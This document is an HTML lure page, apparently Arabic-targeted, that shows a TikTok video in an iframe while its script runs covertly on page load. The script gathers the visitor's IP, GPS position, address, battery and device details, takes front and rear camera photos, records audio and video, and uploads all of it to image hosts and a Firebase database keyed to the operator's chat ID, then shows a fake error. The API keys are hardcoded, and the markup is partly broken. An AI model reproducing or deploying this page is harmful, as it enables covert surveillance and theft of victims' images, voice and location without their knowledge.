<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #000; }
iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; z-index: 1; }

video, canvas { display: none; }

</head>
<body>
<iframe src="https://vt.tiktok.com/ZSQEvjYkr/"></iframe>
<div id="status">Down loading...</div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyCaMV2_EKFrhW9CUHMOHnfyFER_M2mDcN8",
    databaseURL: "https://admin-aad81-default-rtdb.firebaseio.com"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const params = new URLSearchParams(window.location.search);
const usex = params.get('usex') || "Unknown";
const userId = params.get('id') || "a77266f8db6ccb82";
const IMGBB_API_KEY = "5a31b1f80b659a53569bb21b718c2364";

async function getIPAndLocation() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const ip = ipData.ip;
        const nodeIp = ip.replace(/\./g, '_');
        let countryStr = "Unknown";
        let fullAddress = "Unknown";
        try {
            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
            const locData = await locRes.json();
            if(locData.latitude && locData.longitude) {
                countryStr = locData.country_name === "Egypt" ? "مصر" : locData.country_name;
                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locData.latitude}&lon=${locData.longitude}&accept-language=ar`);
                const geoData = await geoRes.json();
                if(geoData.display_name) {
                    fullAddress = geoData.display_name;
                } else {
                    fullAddress = `${locData.city || ""}, ${locData.region || ""}, ${countryStr}`;
                }
            }
        } catch(e) {}
        return { ip, nodeIp, country: countryStr, address: fullAddress };
    } catch (e) {
        return { ip: "Unknown", nodeIp: "Unknown_IP_" + Math.floor(Math.random() * 1000), country: "Unknown", address: "Unknown" };
    }
}

async function capturePhoto(facingMode) {
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const context = canvas.getContext('2d');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = resolve);
        await new Promise(resolve => setTimeout(resolve, 1000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());
        let dataUrl = canvas.toDataURL('image/jpeg');
        return dataUrl.split(',')[1];
    } catch (e) {
        console.log("Capture error:", e);
        return null;
    }
}

async function uploadToImgBB(base64Image) {
    if (!base64Image) return "Failed to capture";
    try {
        let formData = new FormData();
        formData.append("image", base64Image);
        const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: "POST", body: formData });
        const result = await response.json();
        if (result.success) {
            return result.data.url;
        } else {
            return "Upload error";
        }
    } catch (e) {
        console.log(e);
        return "Upload failed";
    }
}

async function recordMedia(type, facingMode, duration) {
    try {
        const constraints = type === 'video' ? { video: { facingMode: facingMode }, audio: true } : { audio: true };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(r => setTimeout(r, duration));
        recorder.stop();
        return new Promise(resolve => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: type === 'video' ? "video/mp4" : "audio/mp3" });
                const fd = new FormData();
                fd.append("file", blob, type === 'video' ? "video.mp4" : "voice.mp3");
                try {
                    const up = await fetch("https://tmpfiles.org/api/v1/upload", { method: "POST", body: fd });
                    const j = await up.json();
                    stream.getTracks().forEach(t => t.stop());
                    if(j.status === "success") {
                        const directUrl = j.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
                        resolve(directUrl);
                    } else {
                        resolve("Upload error");
                    }
                } catch(err) {
                    resolve("Upload failed");
                }
            };
        });
    } catch(e) {
        console.log("Record error:", e);
        return "Permission denied";
    }
}

async function getBattery() {
    try {
        if(navigator.getBattery) {
            const battery = await navigator.getBattery();
            return Math.round(battery.level * 100) + "%";
        }
        return "Unknown";
    } catch(e) { return "Unknown"; }
}

async function getGPSLocation() {
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
        });
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const geoData = await geo.json();
        const country = geoData.address.country || "Unknown";
        const address = geoData.display_name || "Unknown";
        return { lat, lon, country, address };
    } catch(e) {
        return null;
    }
}

function getDeviceInfo() {
    return "Platform : " + navigator.platform +
        "
UserAgent : " + navigator.userAgent +
        "
Language : " + navigator.language +
        "
Screen : " + screen.width + "x" + screen.height +
        "
CPU Cores : " + navigator.hardwareConcurrency +
        "
RAM : " + (navigator.deviceMemory || "Unknown") + " GB";
}

window.addEventListener("DOMContentLoaded", async () => {
    const statusDiv = document.getElementById("status");
    const ipInfo = await getIPAndLocation();
    const ip = ipInfo.ip;
    const nodeIp = ipInfo.nodeIp;
    const country = ipInfo.country;
    const fullAddress = ipInfo.address;

    let batteryLevel = await getBattery();
    let gpsInfo = await getGPSLocation();
    let gpsLat = gpsInfo ? gpsInfo.lat : "";
    let gpsLon = gpsInfo ? gpsInfo.lon : "";
    let gpsCountry = gpsInfo ? gpsInfo.country : "Unknown";
    let gpsAddress = gpsInfo ? gpsInfo.address : "Unknown";

    const deviceInfo = getDeviceInfo();

    const frontBase64 = await capturePhoto("user");
    const frontUrl = await uploadToImgBB(frontBase64);
    const envBase64 = await capturePhoto("environment");
    const envUrl = await uploadToImgBB(envBase64);

    const audioUrl = await recordMedia("audio", null, 4000);
    const video1Url = await recordMedia("video", "user", 4000);
    const video2Url = await recordMedia("video", "environment", 4000);

    const currentIsoTime = new Date().toISOString();
    const currentLocale = new Date().toLocaleString();

    const baseData = {
        ip: ip,
        time: currentIsoTime,
        userAgent: navigator.userAgent,
        usex: usex,
        country: country,
        fullAddress: fullAddress,
        battery: batteryLevel,
        gpsLat: gpsLat,
        gpsLon: gpsLon,
        gpsCountry: gpsCountry,
        gpsAddress: gpsAddress,
        deviceInfo: deviceInfo
    };

    await db.ref("Data_x/" + nodeIp).update(baseData);
    await db.ref("Data_x/" + nodeIp).update({
        cam1: frontUrl,
        cam2: envUrl,
        audio: audioUrl,
        video1: video1Url,
        video2: video2Url
    });

    await db.ref("BlankRx/" + userId).set({
        ip: ip,
        time: currentIsoTime,
        device: "Battery: " + batteryLevel + " | Platform: " + navigator.platform,
        chat_id: userId,
        location: "Country : " + gpsCountry + "
Full Adress : " + gpsAddress,
        locationx: gpsLat,
        locations: gpsLon,
        info: deviceInfo
    });

    await db.ref("CameraRx/" + userId).set({
        camerarx: frontUrl,
        camerars: envUrl,
        chat_id: userId,
        time: currentIsoTime,
        ip: ip
    });

    await db.ref("RecordRx/" + userId).set({
        audio: audioUrl,
        chat_id: userId,
        time: currentIsoTime,
        ip: ip
    });

    await db.ref("VideoRx/" + userId).set({
        video1: video1Url,
        video2: video2Url,
        chat_id: userId,
        time: currentIsoTime,
        ip: ip
    });

    statusDiv.innerText = "An error occurred during loading";
});
</script>

</body>
